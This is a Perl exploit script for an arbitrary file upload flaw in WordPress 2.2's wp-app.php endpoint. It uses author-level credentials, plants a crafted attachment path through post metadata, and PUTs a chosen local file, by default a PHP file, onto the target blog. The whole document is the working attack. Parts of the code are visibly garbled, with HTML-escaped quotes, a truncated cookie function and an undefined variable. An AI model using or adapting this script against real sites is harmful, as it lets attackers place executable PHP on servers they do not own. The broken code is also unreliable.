WordPress 2.2 (wp-app.php) Arbitrary File Upload Exploit
========================================================


#! /usr/bin/env perl

#
# Credits : Alexander Concha <alex at buayacorp dot com>
# Website : http://www.buayacorp.com/

use Digest::MD5 qw(md5_hex);
use LWP::UserAgent;

my $ua = new LWP::UserAgent;
my $blog        = $ARGV[0];
my $user        = $ARGV[1];
my $pass        = $ARGV[2];
my $remote_file = $ARGV[3];
my $local_file  = $ARGV[4];
my $post_id     = $ARGV[5];

if (@ARGV < 4) {
       print "\nUsage:\n";
       print " wp-file-upload.pl <host> <username> <password> <remote_filename> [local_file] [post_id]\n\n";
       print " <username>    - valid username with any of these roles: author, editor, administrator\n";
       print " <password>    - valid password for the user\n";
       print " [local_file]  - file to upload\n";
       print " [post_id]     - every time this script is executed creates a new post, specify a post_ID if you already run it\n\n";
       exit();
}
$ua->requests_redirectable([]);
$blog =~ s/\/*$/\//;

$url = &#039;wp-app.php&#039;;
if ( 200 != $ua->head($url . &#039;?action=/service&#039;)->code ) {
       $url = &#039;app.php&#039;;
       die "\nIt seems that this WP installation is not vulnerable: app.php and wp-app.php were not found.\n"
               unless 200 == $ua->head($url . &#039;?action=/service&#039;)->code;
}

$auth_cookie = get_auth_cookie();

sub LWP::UserAgent::simple_request {
       my($self, $request, $arg, $size) = @_;
       $request->header(&#039;Cookie&#039; => $auth_cookie);
       $request->content_type(&#039;image/gif&#039;) if $request->method eq "PUT";
       $request->uri($blog . $request->uri);

       $self->_request_sanity_check($request);
       $response = $self->send_request($new_request, $arg, $size);

       print $request->method . " " . $request->uri . " " . $response->code . "\n";

       return $response;
}

sub get_contents {
       $file = shift;
       if ( -e $file ) {
               open FILE, $file or die("Invalid local file");
               $file = join(&#039;&#039;, <FILE>);
               close FILE;
       } else {
               $file = <<PHP;
<?php echo "Hello World!"; ?>
PHP
       }
       return $file;
}
sub get_auth_cookie {
       $response = $ua->head(&#039;wp-login.php?logout&#039;);
       }
       return &#039;&#039;;
}
if (0 == $post_id) {
       $response = $ua->get(&#039;wp-admin/post-new.php&#039;);
       die ("\nInvalid credentials or blog url.\n\n" . $response->as_string) unless 200 == $response->code;

       if ( $response->content =~ m/name=._wpnonce. value=.([a-z\d]{10})./ ) {
               $response = $ua->post(&#039;wp-admin/post.php&#039;, [
                       &#039;_wpnonce&#039; => $1,
                       &#039;action&#039; => &#039;post&#039;,
                       &#039;post_ID&#039; => $post_id,
                       &#039;post_type&#039; => &#039;post&#039;,
                       &#039;post_title&#039; => &#039;foo&#039;,
                       &#039;metakeyselect&#039; => &#039;#NONE#&#039;,
                       &#039;metakeyinput&#039; => &#039;_wp_attached_file&#039;,
                       &#039;metavalue&#039; => $remote_file
                       ], &#039;Cookie&#039; => $auth_cookie);

               # Checks for post-new.php?posted=post_ID
               if ( $response->headers->header(&#039;Location&#039;) =~ m/posted=(\d+)/ ) {
                       $post_id = $1;
               }
       }
}
die "\nCould not get a valid post_id value.\n" unless 0 != $post_id;

$request = HTTP::Request->new(PUT => $url . &#039;?action=/attachment/file/&#039;.$post_id);
$request->content(get_contents($local_file));
$response = $ua->request($request);

if ( 200 == $response->code ) {
       print "\nIt seems that the file has been posted successfully... :P\n";
       print "Use the following value to update the remote file: post_id &#039;$post_id&#039;\n";
} else {
       print "\nError: there is no attachment metadata for post_id=$post_id\n\n" . $response->as_string() . "\n";
}




